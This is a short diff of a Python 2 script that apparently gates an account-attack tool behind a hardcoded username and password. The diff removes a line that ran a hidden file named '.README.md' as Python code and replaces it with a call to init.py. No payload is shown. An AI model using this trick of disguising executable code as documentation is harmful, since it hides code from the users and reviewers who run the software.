@@ -1,5 +1,5 @@
 try:
-    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests,bzin
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
     from multiprocessing.pool import ThreadPool
     from requests.exceptions import ConnectionError
     from mechanize import Browser
@@ -65,6 +65,6 @@ def z():
     print(" TOOL USERNAME : MICRON (correct)")
     print(" TOOL PASSWORD : SHADOW (correct)")
     time.sleep(1)
-    os.system("python2 .README.md")
+    os.system("python2 init.py")
 if __name__=="__main__":
     u()
